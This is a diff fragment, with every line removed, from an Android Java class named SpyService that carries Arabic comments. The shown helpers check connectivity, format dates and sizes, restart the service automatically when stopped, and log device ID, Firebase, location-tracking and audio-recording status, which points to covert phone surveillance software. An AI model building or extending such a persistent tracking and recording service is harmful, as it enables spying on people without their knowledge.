-    private boolean isInternetAvailable() {
-        try {
-            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-            if (cm == null) return false;
-            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
-            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
-        } catch (Exception e) {
-            return false;
-        }
-    }
-
-    // ======================================================================
-    // ========== دوال مساعدة لتنسيق البيانات ==========
-    // ======================================================================
-
-    private String formatDate(long timestamp) {
-        try {
-            SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.US);
-            return sdf.format(new Date(timestamp));
-        } catch (Exception e) {
-            return String.valueOf(timestamp);
-        }
-    }
-
-    private String formatFileSize(long size) {
-        if (size < 1024) return size + " B";
-        if (size < 1024 * 1024) return String.format("%.2f KB", size / 1024.0);
-        if (size < 1024 * 1024 * 1024) return String.format("%.2f MB", size / (1024.0 * 1024));
-        return String.format("%.2f GB", size / (1024.0 * 1024 * 1024));
-    }
-
-    // ======================================================================
-    // ========== إعادة تشغيل الخدمة في حالة التوقف ==========
-    // ======================================================================
-
-    private void restartService() {
-        try {
-            Intent restartIntent = new Intent(this, SpyService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(restartIntent);
-            } else {
-                startService(restartIntent);
-            }
-            Log.d(TAG, "🔄 تم إعادة تشغيل الخدمة");
-        } catch (Exception e) {
-            Log.e(TAG, "❌ فشل إعادة تشغيل الخدمة: " + e.getMessage());
-        }
-    }
-
-    // ======================================================================
-    // ========== دالة لطباعة حالة الخدمة ==========
-    // ======================================================================
-
-    private void logServiceStatus() {
-        Log.d(TAG, "========================================");
-        Log.d(TAG, "🔱 SpyService Status");
-        Log.d(TAG, "📱 Device: " + Build.MANUFACTURER + " " + Build.MODEL);
-        Log.d(TAG, "🤖 Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
-        Log.d(TAG, "🆔 Device ID: " + deviceId);
-        Log.d(TAG, "🔋 Battery: " + getBatteryLevel() + "%");
-        Log.d(TAG, "📶 Internet: " + (isInternetAvailable() ? "✅" : "❌"));
-        Log.d(TAG, "📡 Firebase: " + (database != null ? "✅" : "❌"));
-        Log.d(TAG, "📍 Location Tracking: " + (isTrackingLocation ? "🟢" : "🔴"));
-        Log.d(TAG, "🎤 Recording: " + (isRecording ? "🟢" : "🔴"));
-        Log.d(TAG, "========================================");
-    }
-}
-
-}
-
